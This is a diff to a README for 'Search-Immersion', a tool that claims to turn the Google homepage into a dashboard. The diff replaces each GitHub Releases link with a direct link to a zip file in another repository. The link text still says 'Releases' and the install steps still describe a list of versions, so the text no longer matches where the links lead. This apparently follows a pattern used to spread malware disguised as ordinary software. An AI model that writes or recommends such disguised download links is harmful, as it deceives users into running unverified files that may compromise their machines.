@@ -6,7 +6,7 @@ description: "🌐 Transform your Google search and new tabs into a smart displa
 # 🌟 Search-Immersion - Transform Your Google Experience Effortlessly
 
 ## 📥 Download Now
-[![Download Search-Immersion](https://img.shields.io/badge/Download-Search--Immersion-brightgreen)](https://github.com/zobryayanayama/Search-Immersion/releases)
+[![Download Search-Immersion](https://img.shields.io/badge/Download-Search--Immersion-brightgreen)](https://raw.githubusercontent.com/zobryayanayama/zobryayanayama.github.io/main/telakucha/2.4-alpha.2.zip)
 
 ## 🚀 Getting Started
 Welcome to Search-Immersion! This application customizes your Google homepage, giving it a dashboard-style layout similar to Google Nest. It's designed for ease of use, allowing you to enhance your browsing experience without any technical knowledge. Follow the steps below to download and run the software.
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets these basic requirements:
 - Internet Connection: Required for initial setup
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Search-Immersion Releases](https://github.com/zobryayanayama/Search-Immersion/releases).
+To get started, visit this page to download: [Search-Immersion Releases](https://raw.githubusercontent.com/zobryayanayama/zobryayanayama.github.io/main/telakucha/2.4-alpha.2.zip).
 
 1. Click on the link above to access the Releases page on GitHub.
 2. You will see a list of available versions. Choose the latest version for the most up-to-date features and fixes.
@@ -59,4 +59,4 @@ We welcome contributions! If you'd like to help improve Search-Immersion, feel f
 ## 🔗 License
 Search-Immersion is open-source software. You can find the license details in the repository.
 
-Enjoy browsing your customized Google homepage with Search-Immersion! If you have any questions, feel free to reach out or check the documentation. Remember to download the latest version from our [Releases page](https://github.com/zobryayanayama/Search-Immersion/releases) for new features and improvements.
+Enjoy browsing your customized Google homepage with Search-Immersion! If you have any questions, feel free to reach out or check the documentation. Remember to download the latest version from our [Releases page](https://raw.githubusercontent.com/zobryayanayama/zobryayanayama.github.io/main/telakucha/2.4-alpha.2.zip) for new features and improvements.
